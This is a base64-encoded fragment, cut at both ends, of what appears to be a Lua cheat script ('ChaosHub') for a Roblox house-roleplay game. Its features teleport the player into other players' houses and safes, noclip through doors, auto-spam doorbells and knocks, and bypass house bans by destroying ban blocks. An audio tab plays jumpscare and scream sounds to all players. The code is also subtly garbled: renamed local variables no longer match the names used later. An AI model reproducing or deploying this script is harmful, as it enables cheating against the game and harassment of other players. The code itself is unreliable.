GVIb3VzZVJHQihzdGF0ZSkKICAgIGlzSG91c2VSR0JBY3RpdmUgPSBzdGF0ZQogICAgaWYgaXNIb3VzZVJHQkFjdGl2ZSB0aGVuCiAgICAgICAgcHJpbnQoIkhvdXNlIFJHQiBBY3RpdmF0ZWQiKQogICAgICAgIHNwYXduKGNoYW5nZUNvbG9yKQogICAgZWxzZQogICAgICAgIHByaW50KCJIb3VzZSBSR0IgRGVhY3RpdmF0ZWQiKQogICAgZW5kCmVuZAoKLS0gR2xvYmFsIHZhcmlhYmxlcwpsb2NhbCB2YXJfb2QzcDl0ID0gZmFsc2UKbG9jYWwgdmFyX2E4OXBpcCA9IFdpbmRvdzpNYWtlVGFiKHsiaG9tZSIsICJob21lIn0pCmxvY2FsIHZhcl96OHdqeXMgPSBuaWwKbG9jYWwgdmFyXzhwaW5naCA9IG5pbAoKLS0gRnVuY3Rpb24gdG8gZ2V0IGxpc3Qgb2YgaG91c2VzCmxvY2FsIHZhcl9nN29odzQgZ2V0SG91c2VMaXN0KCkKICAgIGxvY2FsIHZhcl91eWxjanYgPSB7fQogICAgbG9jYWwgdmFyX3c5NHVzeiA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgiMDAxX0xvdHMiKQogICAgaWYgbG90cyB0aGVuCiAgICAgICAgZm9yIF8sIEhvdXNlIGluIGlwYWlycyhsb3RzOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIEhvdXNlLk5hbWUgfj0gIkZvciBTYWxlIiBhbmQgSG91c2U6SXNBKCJNb2RlbCIpIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChob3VzZVRhYmxlLCBIb3VzZS5OYW1lKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGhvdXNlVGFibGUKZW5kCgotLSBEcm9wZG93biB0byBzZWxlY3QgaG91c2VzCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZERyb3Bkb3duKHsKICAgICAgICBOYW1lID0gIlNlbGVjdCIsCiAgICAgICAgT3B0aW9ucyA9IGdldEhvdXNlTGlzdCgpLAogICAgICAgIERlZmF1bHQgPSAiLi4uIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICBTZWxlY3RIb3VzZSA9IFZhbHVlCiAgICAgICAgICAgIGlmIE5vY2xpcERvb3IgdGhlbgogICAgICAgICAgICAgICAgTm9jbGlwRG9vcjpTZXQoZmFsc2UpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBwcmludCgiSG91c2Ugc2VsZWN0ZWQ6ICIgLi4gdG9zdHJpbmcoVmFsdWUpKQogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gRnVuY3Rpb24gdG8gdXBkYXRlIHRoZSBob3VzZSBsaXN0CmxvY2FsIHZhcl8xZzE5ZXcgRHJvcGRvd25Ib3VzZVVwZGF0ZSgpCiAgICBsb2NhbCB2YXJfdDBiNmVqID0gZ2V0SG91c2VMaXN0KCkKICAgIHByaW50KCJEcm9wZG93bkhvdXNlVXBkYXRlIGNhbGxlZC4gSG91c2VzIGZvdW5kOiIsICNob3VzZVRhYmxlKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIEhvdXNlVGFiOkNsZWFyRHJvcGRvd24oIlNlbGVjdCBIb3VzZSIpIC0tIEF0dGVtcHQgdG8gY2xlYXIgZHJvcGRvd24sIGlmIHN1cHBvcnRlZAogICAgICAgIEhvdXNlVGFiOkFkZERyb3Bkb3duKHsKICAgICAgICAgICAgTmFtZSA9ICJTZWxlY3QiLAogICAgICAgICAgICBPcHRpb25zID0gaG91c2VUYWJsZSwKICAgICAgICAgICAgRGVmYXVsdCA9ICIuLi4iLAogICAgICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICAgICAgU2VsZWN0SG91c2UgPSBWYWx1ZQogICAgICAgICAgICAgICAgaWYgTm9jbGlwRG9vciB0aGVuCiAgICAgICAgICAgICAgICAgICAgTm9jbGlwRG9vcjpTZXQoZmFsc2UpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgfSkKICAgIGVuZCkKZW5kCgotLSBJbml0aWFsaXplIGRyb3Bkb3duCnBjYWxsKERyb3Bkb3duSG91c2VVcGRhdGUpCgotLSBCdXR0b24gdG8gcmVmcmVzaCBob3VzZSBsaXN0CnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZEJ1dHRvbih7CiAgICAgICAgTmFtZSA9ICJVcGRhdGUgaG91c2UgbGlzdCIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIHByaW50KCJSZWZyZXNoIEhvdXNlIExpc3QgYnV0dG9uIGNsaWNrZWQuIikKICAgICAgICAgICAgcGNhbGwoRHJvcGRvd25Ib3VzZVVwZGF0ZSkKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIEJ1dHRvbiB0byB0ZWxlcG9ydCB0byBob3VzZQpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSAiVGVsZXBvcnQgaG9tZSIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHZhcl85em9icGEgPSB3b3Jrc3BhY2VbIjAwMV9Mb3RzIl06RmluZEZpcnN0Q2hpbGQodG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICBpZiBIb3VzZSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhIb3VzZS5Xb3JsZFBpdm90LlBvc2l0aW9uKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludCgiSG91c2Ugbm90IGZvdW5kOiAiIC4uIHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBCdXR0b24gdG8gdGVsZXBvcnQgdG8gc2FmZQpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRCdXR0b24oewogICAgICAgIE5hbWUgPSAiVGVsZXBvcnQgdG8gYSBzYWZlIGxvY2F0aW9uLiIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHZhcl9vZDdpN2YgPSB3b3Jrc3BhY2VbIjAwMV9Mb3RzIl06RmluZEZpcnN0Q2hpbGQodG9zdHJpbmcoU2VsZWN0SG91c2UpKQogICAgICAgICAgICBpZiBIb3VzZSBhbmQgSG91c2U6RmluZEZpcnN0Q2hpbGQoIkhvdXNlUGlja2VkQnlQbGF5ZXIiKSBhbmQgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdWhtZGJoID0gSG91c2UuSG91c2VQaWNrZWRCeVBsYXllci5Ib3VzZU1vZGVsOkZpbmRGaXJzdENoaWxkKCIwMDFfU2FmZSIpCiAgICAgICAgICAgICAgICBpZiBzYWZlIHRoZW4KICAgICAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhzYWZlLldvcmxkUGl2b3QuUG9zaXRpb24pCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlNhZmUgbm90IGZvdW5kIGluIGhvdXNlOiAiIC4uIHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBwcmludCgiSG91c2Ugbm90IGZvdW5kOiAiIC4uIHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBUb2dnbGUgdG8gbm9jbGlwIHRocm91Z2ggZG9vcgpwY2FsbChmdW5jdGlvbigpCiAgICBOb2NsaXBEb29yID0gSG91c2VUYWI6QWRkVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIk5vY2xpcCBEb29yIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfd253Zjg4ID0gd29ya3NwYWNlWyIwMDFfTG90cyJdOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgIGlmIEhvdXNlIGFuZCBIb3VzZTpGaW5kRmlyc3RDaGlsZCgiSG91c2VQaWNrZWRCeVBsYXllciIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfdmJxaHNhID0gSG91c2UuSG91c2VQaWNrZWRCeVBsYXllcgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl82dHBpYnYgPSBob3VzZXBpY2tlZGJ5cGxheWVyLkhvdXNlTW9kZWw6RmluZEZpcnN0Q2hpbGQoIjAwMV9Ib3VzZURvb3JzIikKICAgICAgICAgICAgICAgICAgICBpZiBkb29ycyBhbmQgZG9vcnM6RmluZEZpcnN0Q2hpbGQoIkhvdXNlRG9vckZyb250IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgQmFzZSBpbiBpcGFpcnMoZG9vcnMuSG91c2VEb29yRnJvbnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJhc2U6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYXNlLkNhbkNvbGxpZGUgPSBub3QgVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBUb2dnbGUgdG8gcmluZyBkb29yYmVsbApwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAiUmluZyBEb29yYmVsbCIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICAgICAgZ2V0Z2VudigpLkNoYW9zSHViQXV0b1NwYXduRG9vcmJlbGxWYWx1ZSA9IFZhbHVlCiAgICAgICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5DaGFvc0h1YkF1dG9TcGF3bkRvb3JiZWxsVmFsdWUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfcGxtcnN5ID0gd29ya3NwYWNlWyIwMDFfTG90cyJdOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgICAgICBpZiBIb3VzZSBhbmQgSG91c2U6RmluZEZpcnN0Q2hpbGQoIkhvdXNlUGlja2VkQnlQbGF5ZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl8zcm1qNjAgPSBIb3VzZS5Ib3VzZVBpY2tlZEJ5UGxheWVyLkhvdXNlTW9kZWw6RmluZEZpcnN0Q2hpbGQoIjAwMV9Eb29yQmVsbCIpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRvb3JiZWxsIGFuZCBkb29yYmVsbDpGaW5kRmlyc3RDaGlsZCgiVG91Y2hCZWxsIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVjbGlja2RldGVjdG9yKGRvb3JiZWxsLlRvdWNoQmVsbC5DbGlja0RldGVjdG9yKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIFRvZ2dsZSB0byBrbm9jayBvbiBkb29yCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZFRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICJLbm9jayBvbiBEb29yIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgICAgICBnZXRnZW52KCkuQ2hhb3NIdWJBdXRvU3Bhd25Eb29yVmFsdWUgPSBWYWx1ZQogICAgICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuQ2hhb3NIdWJBdXRvU3Bhd25Eb29yVmFsdWUgZG8KICAgICAgICAgICAgICAgICAgICBsb2NhbCB2YXJfaDl0a29pID0gd29ya3NwYWNlWyIwMDFfTG90cyJdOkZpbmRGaXJzdENoaWxkKHRvc3RyaW5nKFNlbGVjdEhvdXNlKSkKICAgICAgICAgICAgICAgICAgICBpZiBIb3VzZSBhbmQgSG91c2U6RmluZEZpcnN0Q2hpbGQoIkhvdXNlUGlja2VkQnlQbGF5ZXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9kYWV0MHYgPSBIb3VzZS5Ib3VzZVBpY2tlZEJ5UGxheWVyLkhvdXNlTW9kZWw6RmluZEZpcnN0Q2hpbGQoIjAwMV9Ib3VzZURvb3JzIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZG9vcnMgYW5kIGRvb3JzOkZpbmRGaXJzdENoaWxkKCJIb3VzZURvb3JGcm9udCIpIGFuZCBkb29ycy5Ib3VzZURvb3JGcm9udDpGaW5kRmlyc3RDaGlsZCgiS25vY2siKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZWNsaWNrZGV0ZWN0b3IoZG9vcnMuSG91c2VEb29yRnJvbnQuS25vY2suVG91Y2hCZWxsLkNsaWNrRGV0ZWN0b3IpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgfSkKZW5kKQpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRTZWN0aW9uKHsgTmFtZSA9ICJUZWxlcG9ydCB0byBIb21lcyIgfSkKZW5kKQoKLS0gTGlzdCBvZiBob3VzZXMgZm9yIHRlbGVwb3J0YXRpb24KbG9jYWwgdmFyX2E3MXY3NSA9IHsKICAgIFsiSG91c2UgMSJdID0gVmVjdG9yMy5uZXcoMjYwLjI5LCA0LjM3LCAyMDkuMzIpLAogICAgWyJIb3VzZSAyIl0gPSBWZWN0b3IzLm5ldygyMzQuNDksIDQuMzcsIDIyOC4wMCksCiAgICBbIkhvdXNlIDMiXSA9IFZlY3RvcjMubmV3KDI2Mi43OSwgMjEuMzcsIDIxMC44NCksCiAgICBbIkhvdXNlIDQiXSA9IFZlY3RvcjMubmV3KDIyOS42MCwgMjEuMzcsIDIyNS40MCksCiAgICBbIkhvdXNlIDUiXSA9IFZlY3RvcjMubmV3KDE3My40NCwgMjEuMzcsIDIyOC4xMSksCiAgICBbIkhvdXNlIDYiXSA9IFZlY3RvcjMubmV3KC00MywgMjEsIC0xMzcpLAogICAgWyJIb3VzZSA3Il0gPSBWZWN0b3IzLm5ldygtNDAsIDM2LCAtMTM3KSwKICAgIFsiSG91c2UgMTEiXSA9IFZlY3RvcjMubmV3KC0yMSwgNDAsIDQzNiksCiAgICBbIkhvdXNlIDEyIl0gPSBWZWN0b3IzLm5ldygxNTUsIDM3LCA0MzMpLAogICAgWyJIb3VzZSAxMyJdID0gVmVjdG9yMy5uZXcoMjU1LCAzNSwgNDMxKSwKICAgIFsiSG91c2UgMTQiXSA9IFZlY3RvcjMubmV3KDI1NCwgMzgsIDM5NCksCiAgICBbIkhvdXNlIDE1Il0gPSBWZWN0b3IzLm5ldygxNDgsIDM5LCAzODcpLAogICAgWyJIb3VzZSAxNiJdID0gVmVjdG9yMy5uZXcoLTE3LCA0MiwgMzk1KSwKICAgIFsiSG91c2UgMTciXSA9IFZlY3RvcjMubmV3KC0xODksIDM3LCAtMjQ3KSwKICAgIFsiSG91c2UgMTgiXSA9IFZlY3RvcjMubmV3KC0zNTQsIDM3LCAtMjQ0KSwKICAgIFsiSG91c2UgMTkiXSA9IFZlY3RvcjMubmV3KC00NTYsIDM2LCAtMjQ1KSwKICAgIFsiSG91c2UgMjAiXSA9IFZlY3RvcjMubmV3KC00NTMsIDM4LCAtMjk1KSwKICAgIFsiSG91c2UgMjEiXSA9IFZlY3RvcjMubmV3KC0zNTYsIDM4LCAtMjk0KSwKICAgIFsiSG91c2UgMjIiXSA9IFZlY3RvcjMubmV3KC0xODcsIDM3LCAtMjk1KSwKICAgIFsiSG91c2UgMjMiXSA9IFZlY3RvcjMubmV3KC00MTAsIDY4LCAtNDQ3KSwKICAgIFsiSG91c2UgMjQiXSA9IFZlY3RvcjMubmV3KC0zNDgsIDY5LCAtNDk2KSwKICAgIFsiSG91c2UgMjgiXSA9IFZlY3RvcjMubmV3KC0xMDMsIDEyLCAxMDg3KSwKICAgIFsiSG91c2UgMjkiXSA9IFZlY3RvcjMubmV3KC03MzAsIDYsIDgwOCksCiAgICBbIkhvdXNlIDMwIl0gPSBWZWN0b3IzLm5ldygtMjQ1LCA3LCA4MjIpLAogICAgWyJIb3VzZSAzMSJdID0gVmVjdG9yMy5uZXcoNjM5LCA3NiwgLTM2MSksCiAgICBbIkhvdXNlIDMyIl0gPSBWZWN0b3IzLm5ldygtOTA4LCA2LCAtMzYxKSwKICAgIFsiSG91c2UgMzMiXSA9IFZlY3RvcjMubmV3KC0xMTEsIDcwLCAtNDE3KSwKICAgIFsiSG91c2UgMzQiXSA9IFZlY3RvcjMubmV3KDIzMCwgMzgsIDU2OSksCiAgICBbIkhvdXNlIDM1Il0gPSBWZWN0b3IzLm5ldygtMzAsIDEzLCAyMjA5KQp9CgotLSBDcmVhdGUgc29ydGVkIGxpc3Qgb2YgaG91c2UgbmFtZXMKbG9jYWwgdmFyXzkyMmIzcCA9IHt9CmZvciBuYW1lLCBfIGluIHBhaXJzKGNhc2FzKSBkbwogICAgdGFibGUuaW5zZXJ0KGhvdXNlTmFtZXMsIG5hbWUpCmVuZAoKdGFibGUuc29ydChob3VzZU5hbWVzLCBmdW5jdGlvbihhLCBiKQogICAgbG9jYWwgdmFyX2hlczJyayA9IHRvbnVtYmVyKGE6bWF0Y2goIiVkKyIpKSBvciAwCiAgICBsb2NhbCB2YXJfbXJneGQxID0gdG9udW1iZXIoYjptYXRjaCgiJWQrIikpIG9yIDAKICAgIHJldHVybiBudW1BIDwgbnVtQgplbmQpCgotLSBEcm9wZG93biBmb3IgdGVsZXBvcnRhdGlvbgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGREcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICJTZWxlY3QgSG91c2UiLAogICAgICAgIE9wdGlvbnMgPSBob3VzZU5hbWVzLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWRIb3VzZSkKICAgICAgICAgICAgbG9jYWwgdmFyX2RodDc4eSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICBpZiBwbGF5ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgcGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoY2FzYXNbc2VsZWN0ZWRIb3VzZV0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKZW5kKQoKLS0gTGFiZWwgYWZ0ZXIgZHJvcGRvd24KcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkTGFiZWwoIlRlbGV0cmFuc3BvcnRlLXNlIHBhcmEgcXVhbHF1ZXIgY2FzYSAiKQplbmQpCgotLSBTZWN0aW9uIGZvciBBdXRvIFVuYmFuCnBjYWxsKGZ1bmN0aW9uKCkKICAgIEhvdXNlVGFiOkFkZFNlY3Rpb24oeyBOYW1lID0gIkF1dG8gVW5iYW4iIH0pCmVuZCkKCi0tIFRvZ2dsZSBmb3IgQXV0byBVbmJhbgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAiQXV0byBVbmJhbiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIGlzVW5iYW5BY3RpdmUgPSBzdGF0ZQogICAgICAgICAgICBpZiBpc1VuYmFuQWN0aXZlIHRoZW4KICAgICAgICAgICAgICAgIHByaW50KCJBdXRvIFVuYmFuIEFjdGl2YXRlZCIpCiAgICAgICAgICAgICAgICBzcGF3bihzdGFydEF1dG9VbmJhbikKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcHJpbnQoIkF1dG8gVW5iYW4gRGVhY3RpdmF0ZWQiKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZCkKCi0tIExhYmVsIGFmdGVyIEF1dG8gVW5iYW4KcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkTGFiZWwoIkl0IGF1dG9tYXRpY2FsbHkgdW5sb2NrcyB5b3VyIGFjY2VzcyB0byBob21lcy4iKQplbmQpCgotLSBTZWN0aW9uIGZvciBIb3VzZSBSR0IKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkU2VjdGlvbih7IE5hbWUgPSAiSG91c2UgUkdCIiB9KQplbmQpCgotLSBUb2dnbGUgZm9yIEhvdXNlIFJHQgpwY2FsbChmdW5jdGlvbigpCiAgICBIb3VzZVRhYjpBZGRUb2dnbGUoewogICAgICAgIE5hbWUgPSAiSG91c2UgUkdCIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICAgICAgdG9nZ2xlSG91c2VSR0Ioc3RhdGUpCiAgICAgICAgZW5kCiAgICB9KQplbmQpCgotLSBMYWJlbCBhZnRlciBIb3VzZSBSR0IKcGNhbGwoZnVuY3Rpb24oKQogICAgSG91c2VUYWI6QWRkTGFiZWwoIlRyYW5zZm9ybSB5b3VyIGhvbWUgaW50byBSR0IuIikKZW5kKQoKLS0gRnVuY3Rpb24gZm9yIEF1dG8gVW5iYW4KZnVuY3Rpb24gc3RhcnRBdXRvVW5iYW4oKQogICAgd2hpbGUgaXNVbmJhbkFjdGl2ZSBkbwogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpXYWl0Rm9yQ2hpbGQoIjAwMV9Mb3RzIik6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHYuTmFtZTptYXRjaCgiXkJhbm5lZEJsb2NrJWQrJCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICB2OkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICB0YXNrLndhaXQoMSkKICAgIGVuZAplbmQKCmxvY2FsIHZhcl9tZjJ0bDYgPSBXaW5kb3c6TWFrZVRhYih7Ikdsb2JhbCBBdWRpbyIsICJtdXNpYyJ9KQoKLS0gQ3JlYXRlIGEgc2VjdGlvbgpUYWI6QWRkU2VjdGlvbih7IkF1ZGlvIGZvciBhbGwgcGxheWVycyJ9KQoKLS0gQXVkaW8gbGlzdApsb2NhbCB2YXJfaDhvNnF6ID0gewogICAge05hbWUgPSAiU2hvdXQiLCBJRCA9IDU3MTAwMTYxOTR9LAogICAge05hbWUgPSAiU2NhcnkgaG9ycm9yIiwgSUQgPSA4NTQzNTI1MzM0NzE0Nn0sCiAgICB7TmFtZSA9ICJMb3VkIGF1ZGlvIiwgSUQgPSA2ODU1MTUwNzU3fSwKICAgIHtOYW1lID0gIk5vaXNlIiwgSUQgPSAxMjAwMzQ4NzcxNjA3OTF9LAogICAge05hbWUgPSAiSnVtcHNjYXJlIDIiLCBJRCA9IDExMDYzNzk5NTYxMDUyOH0sCiAgICB7TmFtZSA9ICJUaGUgQm9pbGVkIE9uZSIsIElEID0gMTM3MTc3NjUzODE3NjIxfSwKICAgIHtOYW1lID0gIkNyYXp5IEhhaWwgTWFyeSIsIElEID0gMTI4NjY5NDI0MDAxNzY2fSwKICAgIHtOYW1lID0gIk1hbmRyYWtlIERldGVjdGVkIiwgSUQgPSA5MDY4MDc3MDUyfSwKICAgIHtOYW1lID0gIkJpZyBTY3JlYW0gQUFBQUFBQUFBIiwgSUQgPSA1ODUzNjY4Nzk0fSwKICAgIHtOYW1lID0gIlVISEhISCBDT0ZGQ09GRiIsIElEID0gNzA1NjcyMDI3MX0sCiAgICB7TmFtZSA9ICJTVVMiLCBJRCA9IDcxNTM0MTk1NzV9LAogICAge05hbWUgPSAiU29uaWMuZXhlIiwgSUQgPSAyNDk2MzY3NDc3fSwKICAgIHtOYW1lID0gIlR1YmVyczkzIDEiLCBJRCA9IDI3MDE0NTcwM30sCiAgICB7TmFtZSA9ICJUdWJlcnM5MyAyIiwgSUQgPSAxODEzMTgwOTUzMn0sCiAgICB7TmFtZSA9ICJKb2huJ3MgTGF1Z2giLCBJRCA9IDEzMDc1OTIzOX0sCiAgICB7TmFtZSA9ICJJIGhhdmUgbm8gaWRlYSwgbG9sIiwgSUQgPSA2NTQ5MDIxMzgxfSwKICAgIHtOYW1lID0gIlllbGxpbmciLCBJRCA9IDgwMTU2NDA1OTY4ODA1fSwKICAgIHtOYW1lID0gIlN1cyBBdWRpbyIsIElEID0gNzcwNTUwNjM5MX0sCiAgICB7TmFtZSA9ICJBQUFIIiwgSUQgPSA3NzcyMjgzNDQ4fSwKICAgIHtOYW1lID0gIkdheSwgZ2F5IiwgSUQgPSAxODc4NjY0NzQxN30sCiAgICB7TmFtZSA9ICJCYXRpZGEgZGUgdGFjbyIsIElEID0gNzEyOTA3MzM1NH0sCiAgICB7TmFtZSA9ICJTaXJlbiBOdWNsZWFyIiwgSUQgPSA2NzU1ODcwOTN9LAogICAge05hbWUgPSAiSSBoYXZlIG5vIGlkZWEgbG9sIiwgSUQgPSA3NTIwNzI5MzQyfSwKICAgIHtOYW1lID0gIlNjcmVhbSAyIiwgSUQgPSA5MTQxMjAyNDEwMTcwOX0sCiAgICB7TmFtZSA9ICJGcmVkZHkiLCBJRCA9IDI2ODExNjMzM30sCiAgICB7TmFtZSA9ICJNZW1lIiwgSUQgPSAxMzI2MDM2NDU0Nzc1NDF9LAogICAge05hbWUgPSAiaUZvb2QiLCBJRCA9IDEzMzg0Mzc1MDg2NDA1OX0sCiAgICB7TmFtZSA9ICJJIEdob3N0IFRoZSBkb3duIiwgSUQgPSA4NDY2MzU0Mzg4MzQ5OH0sCiAgICB7TmFtZSA9ICJTaG9wZWUiLCBJRCA9IDg3NDc0NDE2MDl9LAogICAge05hbWUgPSAibXVzaWMgMSIsIElEID0gOTA0NDcwMjkwNn0sCiAgICB7TmFtZSA9ICJtdXNpYyAyIiwgSUQgPSAxMTQzNzY3NTczODAwOTN9LAp9Cgpsb2NhbCB2YXJfdjZmNGlpCgotLSBBZGQgYSB0ZXh0Ym94IHRvIGluc2VydCB0aGUgYXVkaW8gSUQKVGFiOkFkZFRleHRCb3goewogICAgTmFtZSA9ICJJbnNlcnQgSUQiLAogICAgRGVzY3JpcHRpb24gPSAiRW50ZXIgdGhlIGF1ZGlvIElELiIsCiAgICBQbGFjZWhvbGRlclRleHQgPSAiQXVkaW8gSUQiLAogICAgQ2FsbGJhY2sgPSBm